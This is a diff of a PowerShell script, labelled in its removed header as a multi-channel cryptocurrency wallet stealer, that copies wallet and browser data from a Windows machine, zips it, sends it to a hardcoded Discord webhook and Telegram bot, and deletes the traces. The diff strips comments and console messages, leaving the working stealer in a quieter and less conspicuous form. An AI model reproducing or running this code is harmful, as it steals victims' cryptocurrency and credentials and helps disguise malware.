@@ -1,22 +1,12 @@
 #Requires -Version 5.1
-
-# ============================================================
-# MULTI-C2 WALLET STEALER - Windows Version (DISCORD + TELEGRAM)
-# Exfiltrates to: Discord + Telegram
-# ============================================================
-
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === CONFIGURATION ===
 $DEST = "$env:TEMP\myfiles"
 $WDIR = "$DEST\mycryptowallet"
 $DESK = [Environment]::GetFolderPath("Desktop")
 $MAX = 102400
-
-# === C2 ENDPOINTS ===
 $DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1542884569437569145/BTwXNkIkJVhoBkZbB6qxzd7cqbET39qEmTc0T2XtdWaJyULFFCJXBi55mpFGYdF3WzqR"
 
-# === FUNCTIONS (scanning) ===
 function sn($s) { $s -replace '[\\/:*?"<>|(){} @.]', '_' }
 function scp($s,$d) { if (Test-Path $s) { Copy-Item $s $d -Recurse -Force -EA SilentlyContinue } }
 
@@ -182,22 +172,13 @@ function brave_builtin {
     }
 }
 
-# ============================================================
-# C2 EXFILTRATION FUNCTIONS (WORKING)
-# ============================================================
-
 function Exfil-Discord {
     param([string]$FilePath)
     try {
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         $base64 = [Convert]::ToBase64String($fileBytes)
         $fileName = Split-Path $FilePath -Leaf
-        
-        $jsonPayload = @{
-            content = "📦 Stolen data: $fileName"
-            file = $base64
-        } | ConvertTo-Json -Compress
-        
+        $jsonPayload = @{ content = "Stolen data: $fileName"; file = $base64 } | ConvertTo-Json -Compress
         Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
         return $true
     } catch { return $false }
@@ -206,91 +187,35 @@ function Exfil-Discord {
 function Exfil-Telegram {
     param([string]$FilePath)
     try {
-        # Hardcoded credentials (scope-proof)
         $token = "8260472498:AAFsG2LqDNxQm71kL3aCYTiRDQqIKz_7jxA"
         $chatId = "7361517001"
         $fileName = Split-Path $FilePath -Leaf
-        
         Add-Type -AssemblyName System.Net.Http -EA Stop
-        
         $url = "https://api.telegram.org/bot$token/sendDocument"
-        
         $client = New-Object System.Net.Http.HttpClient
         $multipart = New-Object System.Net.Http.MultipartFormDataContent
-        
         $chatContent = New-Object System.Net.Http.StringContent($chatId)
         $multipart.Add($chatContent, "chat_id")
-        
         $fileStream = [System.IO.File]::OpenRead($FilePath)
         $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
         $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
         $multipart.Add($fileContent, "document", $fileName)
-        
         $response = $client.PostAsync($url, $multipart).Result
         $responseContent = $response.Content.ReadAsStringAsync().Result
-        
-        $fileStream.Close()
-        $client.Dispose()
-        $multipart.Dispose()
-        
+        $fileStream.Close(); $client.Dispose(); $multipart.Dispose()
         $json = $responseContent | ConvertFrom-Json
         return $json.ok -eq $true
-    } catch {
-        return $false
-    }
+    } catch { return $false }
 }
-
-function Exfil-All {
-    param([string]$FilePath)
-    
-    # Debug: Check if file exists
-    if (-not (Test-Path $FilePath)) {
-        Write-Host "❌ File not found: $FilePath" -ForegroundColor Red
-        return 0
-    }
-    Write-Host "📁 File size: $((Get-Item $FilePath).Length) bytes" -ForegroundColor Gray
-    
-    $methods = @(
-        @{Name="Discord"; Function={Exfil-Discord $FilePath}},
-        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}}
-    )
-    $success = 0
-    Write-Host "📤 Exfiltrating to TWO C2 channels..." -ForegroundColor Yellow
-    foreach ($method in $methods) {
-        Write-Host -NoNewline "  → $($method.Name)... "
-        $result = & $method.Function
-        if ($result) {
-            Write-Host "✅" -ForegroundColor Green
-            $success++
-        } else {
-            Write-Host "❌" -ForegroundColor Red
-        }
-    }
-    Write-Host "📊 Exfiltrated to $success/2 channels" -ForegroundColor Cyan
-    return $success
-}
-
-# ============================================================
-# MAIN EXECUTION
-# ============================================================
 
 if ($env:OS -ne "Windows_NT") { exit 1 }
 
-Write-Host "🔍 Scanning for cryptocurrency wallets..." -ForegroundColor Yellow
 New-Item $DEST -ItemType Directory -Force -EA SilentlyContinue | Out-Null
 New-Item $WDIR -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+desktop; chromium; firefox_scan; brave_builtin
 
-desktop
-chromium
-firefox_scan
-brave_builtin
-
-"TEST_DATA $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File "$DEST\test.txt" -Encoding UTF8 -Force
-
-# Create ZIP
 $ZIP_OUT = "$env:TEMP\myfiles.zip"
 if (Test-Path $ZIP_OUT) { Remove-Item $ZIP_OUT -Force -EA SilentlyContinue }
-
 try {
     Add-Type -Assembly System.IO.Compression.FileSystem -EA Stop
     [System.IO.Compression.ZipFile]::CreateFromDirectory($DEST, $ZIP_OUT)
@@ -298,20 +223,12 @@ try {
     try { Compress-Archive -Path "$DEST\*" -DestinationPath $ZIP_OUT -Force -EA SilentlyContinue } catch {}
 }
 
-# Exfiltrate
 if (Test-Path $ZIP_OUT) {
-    $successCount = Exfil-All $ZIP_OUT
-    if ($successCount -gt 0) {
-        Write-Host "✅ Successfully exfiltrated via $successCount C2 channels" -ForegroundColor Green
-    } else {
-        Write-Host "❌ All C2 channels failed - check credentials" -ForegroundColor Red
-    }
-} else {
-    Write-Host "❌ Failed to create ZIP archive" -ForegroundColor Red
+    $success = 0
+    if (Exfil-Discord $ZIP_OUT) { $success++ }
+    if (Exfil-Telegram $ZIP_OUT) { $success++ }
 }
 
-# Cleanup
 Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
 Remove-Item $ZIP_OUT -Force -EA SilentlyContinue
-
-Write-Host "✅ Done." -ForegroundColor Green
+exit 0
